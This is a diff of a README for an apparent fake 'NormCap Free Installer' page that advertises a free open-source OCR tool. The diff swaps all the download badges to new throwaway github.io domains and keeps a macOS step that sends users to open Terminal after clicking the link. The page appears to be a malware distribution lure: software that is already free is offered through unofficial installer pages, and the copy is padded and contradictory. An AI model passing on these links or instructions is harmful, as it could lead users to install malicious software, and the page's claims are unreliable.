@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-OCR-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-OCR+Tool-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 NormCap Free Installer** — NormCap is a free, open-source OCR (optical character recognition) tool for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
+**💻 NormCap Free Installer** — NormCap is a free, open-source screen capture and OCR tool for Windows, macOS, and Linux. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install NormCap](https://img.shields.io/badge/⬇_Install_NormCap-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install NormCap](https://img.shields.io/badge/⬇_Install_NormCap-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About NormCap
 
-NormCap is a free, open-source OCR (optical character recognition) tool for Windows, macOS, and Linux. Capture any region of your screen, and NormCap extracts the text from the screenshot using the Tesseract OCR engine. Select text from images, PDFs displayed on screen, or any graphical application that doesn't support text copying. NormCap works offline with no internet required.
+NormCap is a free, open-source screen capture and OCR tool for Windows, macOS, and Linux. Draw a selection on screen and it instantly extracts the text from that region to the clipboard — perfect for copying text from PDFs, images, or locked interfaces.
 
 ---
 
 ## ❌ Problem: NormCap is hard to access
 
-- **OCR Accuracy** — Accuracy depends on text size, font, and image quality
-- **Tesseract Dependency** — Requires Tesseract OCR engine and language packs installed
-- **Complex Layouts** — Columns, tables, and mixed-orientation text reduce accuracy
-- **Handwriting** — Not suitable for handwritten text recognition
+- **OCR Accuracy** — Text recognition accuracy varies by font, size, and image quality
+- **Tesseract Dependency** — Requires Tesseract OCR installation for best accuracy
+- **Language Models** — Additional language recognition requires downloading language data
+- **Screenshot Required** — Works on screen content only; cannot process files directly
 
 ---
 
@@ -61,9 +61,9 @@ NormCap is a free, open-source OCR (optical character recognition) tool for Wind
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ NormCap is a free, open-source OCR (optical character recognition) tool for Wind
 
 <div align="center">
 
-[![⬇ Install NormCap](https://img.shields.io/badge/⬇_Install_NormCap-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install NormCap](https://img.shields.io/badge/⬇_Install_NormCap-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ NormCap is a free, open-source OCR (optical character recognition) tool for Wind
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ NormCap is a free, open-source OCR (optical character recognition) tool for Wind
 
 ---
 
-**NormCap Free Installer** — NormCap is a free, open-source OCR (optical character recognition) tool for Windows, macOS, and Linux. Install without internet connection today!
+**NormCap Free Installer** — NormCap is a free, open-source screen capture and OCR tool for Windows, macOS, and Linux. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install NormCap](https://img.shields.io/badge/⬇_Install_NormCap-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install NormCap](https://img.shields.io/badge/⬇_Install_NormCap-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
